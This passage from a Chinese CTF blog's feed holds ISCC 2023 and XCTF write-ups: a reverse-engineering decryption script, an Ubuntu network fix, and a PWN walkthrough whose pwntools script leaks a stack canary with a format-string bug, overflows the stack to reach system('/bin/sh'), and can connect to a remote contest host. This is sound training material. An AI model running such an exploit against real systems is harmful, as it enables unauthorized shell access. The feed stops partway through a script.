id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>ISCC{zBzyaaVzVcyavQcQzsBz}</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B08.png" alt="ISCC2023-变形记8.png"></p>]]></content>
    
    
    <summary type="html">2023 ISCC 的一道逆向题，难度不算大，但是要理清楚函数的逻辑，有一些算法的实现不太好理解，最重要的是要能看出 Base64 加密的伪代码</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>【ISCC 2023】JustDoIt</title>
    <link href="https://www.4ss1du0us.cn/2023/06af6a683e.html"/>
    <id>https://www.4ss1du0us.cn/2023/06af6a683e.html</id>
    <published>2023-06-07T12:23:24.000Z</published>
    <updated>2023-06-30T01:42:06.469Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>对于加密算法的逆向，根据密文恢复明文</li></ul><hr><p><a href="https://iscc.isclab.org.cn/">（2023年5月1日-2023年5月25日）【ISCC 2023】JustDoIt</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>用 32 位 IDA 打开，<code>shift + F12</code> 查看与 flag 有关信息，跟进过去<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-JustDoIt1.png" alt="ISCC2023-JustDoIt1.png"><br>结合运行程序的输出可知<br><code>sub_4865AD()</code> 为 <code>printf()</code> 函数<br><code>sub_484D2F()</code> 为 <code>scanf()</code> 函数<br>其中，<code>v5</code> 为明文，<code>v8</code> 为密文</p></li><li><p>分析可知加密逻辑在 <code>sub_487C91()</code> 中，<code>sub_487C91()</code> 执行 <code>sub_499080()</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-JustDoIt2.png" alt="ISCC2023-JustDoIt2.png"><br>逻辑比较清晰了，都是一些常规运算，逆过来写一个解密函数即可<br>加密逻辑：<br>① 先将 <code>flag</code> 的每个元素减 60<br>② 然后将字符串的顺序往后顺延一位<br>③ 通过 <code>for</code> 循环把每一位字符加上其数组索引<br>④ 再通过一个 <code>for</code> 循环进行除、取余、异或等操作处理字符串</p></li><li><p>按照逻辑，编写脚本解密即可</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span>  </span>  <span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>      <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> v8<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">23</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">68</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">68</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">94</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">24</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">87</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">26</span><span class="token punctuation">;</span>        v8<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'i'</span><span class="token punctuation">;</span>    <span class="token comment">// 注意最后一位</span>      <span class="token keyword">char</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token char">'I'</span><span class="token punctuation">,</span> <span class="token char">'S'</span><span class="token punctuation">,</span> <span class="token char">'C'</span><span class="token punctuation">,</span> <span class="token char">'C'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> m <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>m <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>          v8<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token operator">*</span>key<span class="token punctuation">;</span>          v8<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">-=</span> key<span class="token punctuation">[</span>m <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">;</span>          v8<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">6</span><span class="token punctuation">;</span>          v8<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">-=</span> key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">7</span> <span class="token operator">+</span> <span class="token operator">*</span>key <span class="token operator">%</span> <span class="token number">7</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>          v8<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">-=</span> k<span class="token punctuation">;</span>        <span class="token keyword">int</span> tmp <span class="token operator">=</span> v8<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">14</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>j <span class="token punctuation">)</span>          v8<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>          v8<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">60</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>l<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> v8<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>ISCC{Just~Do~It}</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-JustDoIt3.png" alt="ISCC2023-JustDoIt3.png"></p>]]></content>
    
    
    <summary type="html">2023 ISCC 的一道逆向题，主要是对加密算法逻辑的逆向，难度不大，不过要注意数组的最后一个数据给出的形式</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>【ISCC 2023】三个愿望</title>
    <link href="https://www.4ss1du0us.cn/2023/065cc69016.html"/>
    <id>https://www.4ss1du0us.cn/2023/065cc69016.html</id>
    <published>2023-06-07T09:52:37.000Z</published>
    <updated>2023-06-30T11:15:18.112Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>伪随机数绕过</p></li><li><p><mark>利用格式化字符串漏洞绕过 <code>canary</code> 金丝雀保护</mark></p></li><li><p>最后一步溢出时，跳转地址为 <code>system(&quot;/bin/sh&quot;)</code> 的地址 <code>0x4011F5</code>，比赛时使用 <code>elf.symbols[&quot;haveadoor&quot;]</code>（<code>0x4011D6</code>）在远程是可以的，但本地无法 PWN 通</p></li></ul><hr><p><a href="https://iscc.isclab.org.cn/">（2023年5月1日-2023年5月25日）【ISCC 2023】三个愿望</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>分析文件并运行：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B1.png" alt="2023ISCC-三个愿望1.png"><br>开启了金丝雀保护，栈不可执行，但没有开启 PIE 地址随机化</p></li><li><p>在 IDA 下分析：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B2.png" alt="2023ISCC-三个愿望2.png"><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B3.png" alt="2023ISCC-三个愿望3.png"><br>首先输入 <code>s</code>，<code>s</code> 的长度为 0x16，观察栈中数据，发现 <code>s</code> 的长度不足以覆盖栈上的返回地址<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B4.png" alt="2023ISCC-三个愿望4.png"><br>后面需要绕过伪随机数的校验，发现伪随机数种子 <code>seed</code> 是可以由 <code>s</code> 覆盖的<br>因此可以通过 <code>s</code> 将 <code>seed</code> 覆盖为我们设置的值，即可绕过每一次伪随机数校验</p></li><li><p>绕过伪随机数后，进入 <code>secondwish()</code> 函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B5.png" alt="2023ISCC-三个愿望5.png"><br>输入 <code>s</code> 并且 <code>printf(s)</code> 存在格式化字符串漏洞<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B7.png" alt="2023ISCC-三个愿望7.png"><br><code>s</code> 的长度为 0x10，无法覆盖栈上的返回地址，最后 <code>var_8</code> 的地方为 <code>canary</code></p></li><li><p>当执行完 <code>secondwish()</code> 函数后，<code>v3 = 1</code>，下一次循环进入 <code>thirdwish()</code> 函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B6.png" alt="2023ISCC-三个愿望6.png"><br>输入 <code>s</code> 的长度为 0x40 是可以溢出到返回地址的，但是栈中 <code>var_8</code> 处存在 <code>canary</code> 保护，不可以直接覆盖返回地址<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B8.png" alt="2023ISCC-三个愿望8.png"></p></li><li><p>同时，存在后门函数 <code>haveadoor()</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B9.png" alt="2023ISCC-三个愿望9.png"><br>查看 <code>system(&quot;/bin/sh&quot;)</code> 的地址为 <code>0x4011F5</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B10.png" alt="2023ISCC-三个愿望10.png"></p></li><li><p>所以思路就是利用 <code>thirdwish()</code> 函数中的 <code>s</code> 溢出覆盖返回地址为 <code>0x4011F5</code>，即可触发 <code>system(&quot;/bin/sh&quot;)</code><br><mark>关键就在于如何绕过金丝雀 <code>canary</code> 来覆盖返回地址</mark></p></li><li><p>由于 <code>secondwish()</code> 函数中存在格式化字符串漏洞，并且栈中也存在 <code>canary</code> 保护，因此可以利用格式化字符串漏洞将栈上的 <code>canary</code> 的值打印出来，即可获取 <code>canary</code> 的值，在 <code>thirdwish()</code> 函数中利用栈溢出覆盖时保持 <code>canary</code> 的值不动即可</p></li></ol><blockquote><p><strong>关于 canary</strong><br><em>canary 的值在程序每一次运行都是会改变的<br>但是，在一个程序的一次运行过程中，canary 的值都是相同的</em><br>因此 <code>secondwish()</code> 函数的栈中泄露出的 <code>canary</code> 的值，其实和 <code>thirdwish()</code> 函数中的 <code>canary</code> 的值是一样的</p></blockquote><ol start="8"><li>由于 <code>secondwish()</code> 函数中 <code>s</code> 距离金丝雀 <code>var_8</code> 的长度为：0x30 - 0x8 &#x3D; 0x28<br>64 位程序一个参数占用 8 字节，0x28 &#x2F; 8 &#x3D; 5，即：<code>var_8</code> 是栈上的第 5 个参数<br>64 位程序的前 6 个参数存放在寄存器 <code>RDI</code>、<code>RSI</code>、<code>RDX</code>、<code>RCX</code>、<code>R8</code>、<code>R9</code> 内，当超过 6 个参数才存入栈中<br>因此 <code>var_8</code> 的值应在第 6 + 5 &#x3D; 11 个参数的位置，使用 <code>printf(&quot;%11$p&quot;)</code> 将其泄露，这个值就是金丝雀 <code>canary</code></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment"># 导入ctypes库使Python可以执行C语言的函数</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/三个愿望/makewishes"</span><span class="token punctuation">)</span>haveadoor_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"haveadoor"</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 绕过随机数校验</span>    <span class="token keyword">global</span> io    lib <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/三个愿望/libc.so.6"</span><span class="token punctuation">)</span>  <span class="token comment"># C运行库</span>    lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 将种子设为1</span>    number <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">9</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 执行随机函数</span>    <span class="token keyword">return</span> number<span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/三个愿望/makewishes"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"59.110.164.72"</span><span class="token punctuation">,</span> <span class="token number">10001</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x16</span> <span class="token operator">-</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Now you can make your first wish\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 设置伪随机数种子为1</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please give me a number!\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>srand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 绕过伪随机数校验</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Now you can make your second wish!\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"%11$p"</span><span class="token punctuation">)</span>  <span class="token comment"># 格式化字符串漏洞泄露canary（栈上第11个值）</span>canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 接收canary的值</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please give me a number!\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>srand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 绕过伪随机数校验</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Now you can make your final wish!\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4011F5</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B11.png" alt="2023ISCC-三个愿望11.png"></p>]]></content>
    
    
    <summary type="html">2023 ISCC 的一道 PWN 题，主要考察利用格式化字符串漏洞来绕过金丝雀保护</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu虚拟机网络图标消失</title>
    <link href="https://www.4ss1du0us.cn/2023/05a2fb6ec7.html"/>
    <id>https://www.4ss1du0us.cn/2023/05a2fb6ec7.html</id>
    <published>2023-05-17T08:11:01.000Z</published>
    <updated>2023-05-17T13:38:20.509Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><blockquote><p>Ubuntu 虚拟机网络图标消失，整个网络模块都不见了，虚拟机也无法联网，怎么重启都没有用</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B11.png" alt="Ubuntu虚拟机网络图标消失1.png"></p><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B12.png" alt="Ubuntu虚拟机网络图标消失2.png"></p><hr><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><blockquote><p>原因暂时未知，莫名其妙的 bug，用着用着就单机了 QAQ</p></blockquote><hr><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><blockquote><p>比较推荐这个，如果不行再尝试方法二</p></blockquote><p>在终端下，重启网络管理器：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmcli network off<span class="token function">sudo</span> nmcli network on<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><blockquote><p>这个方法我之前成功过，不过有时候也没作用，主要是需要关机，很麻烦</p></blockquote><p>打开 VM 的虚拟网络编辑器，按下图箭头顺序，还原默认设置，然后再打开虚拟机即可</p><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B13.png" alt="Ubuntu虚拟机网络图标消失3.png"></p>]]></content>
    
    
    <summary type="html">有时候 VM 会有个离奇的 bug，你的网络可能会在某个不经意间就消失了，不仅网络图标没了，连设置里都找不到整个网络模块了，瞬间进入单机时代。。。</summary>
    
    
    
    <category term="日常" scheme="https://www.4ss1du0us.cn/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="日常" scheme="https://www.4ss1du0us.cn/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>【攻防世界】BABYRE</title>
    <link href="https://www.4ss1du0us.cn/2023/0597260469.html"/>
    <id>https://www.4ss1du0us.cn/2023/0597260469.html</id>
    <published>2023-05-11T14:43:39.000Z</published>
    <updated>2023-06-07T12:34:26.530Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>了解 <mark>SMC 自解码的原理</mark>，使用 IDA 脚本破解 SMC 自解码</p></li><li><p><mark>新版 IDA 与 旧版 IDA 由于 API 改变，脚本写法有所不同</mark></p></li><li><p><mark>通过 IDA 远程调试绕过 SMC 自解码</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/8813b6340dfc4b009c45a8cf81999a3e.babyRE">【攻防世界】BABYRE</a></p><hr><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><ol><li><p>IDA 打开，定位到主函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE1.png" alt="攻防世界_BABYRE1.png"><br>逻辑感觉很简单<br>首先对 <code>judge[]</code> 数组做异或操作，跟进 <code>judge[]</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE2.png" alt="攻防世界_BABYRE2.png"><br>要求用户输入 <code>s</code>，<code>v5</code> 是 <code>s</code> 的长度，只要满足 <code>if(v5 == 14 &amp;&amp; (*judge)(s))</code> 就能得到 flag</p></li><li><p>但是乍一看，这个条件好像有哪里怪怪的<br><code>v5 == 14</code> 这个好理解，但是 <code>(*judge)(s)</code> 就很奇怪<br>前面的 <code>jugde[]</code> 是个数组，怎么这里变成一个函数了？</p></li><li><p>本来一度摸不着头脑，注意到刚开始的异或操作：<code>for ( i = 0; i &lt;= 181; ++i )</code><br>这里循环了 182 次，我们再回到 <code>judge[]</code> 定义的地方<br><code>judge</code> 的起始地址是 <code>0x600B00</code>，182 就是 <code>0xB6</code><br>那结尾的地址就是 <code>0x600B00 + 0xB6 - 1 = 0x600BB5</code></p></li><li><p>从上往下跟过去看一下 <code>judge</code> 后面的内容<br>但是内容都是这样的十六进制数据<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE3.png" alt="攻防世界_BABYRE3.png"></p></li><li><p>联想到程序中的数据、指令、代码其实都是二进制数据形式存放的<br><strong>于是猜测这个 <code>judge</code> 可能本来就不是一个数组，而是函数<br>这些内容其实就是函数里的数据，只是经过了加密处理，程序开头的异或操作可能就是一种对 <code>judge</code> 的解密，把 <code>judge</code> 恢复成了正常的函数</strong>（其实就是 <code>SMC</code> 自解码）</p></li><li><p><mark>首先按照这个主函数给出的逻辑对 <code>judge</code> 进行解密</mark><br>因为异或的数据比较多，输入<code>快捷键 shift + F2</code> 打开 IDA 的脚本编辑器，输入如下脚本：<br>（适用于 IDA 7.0 以后的版本）</p></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">address <span 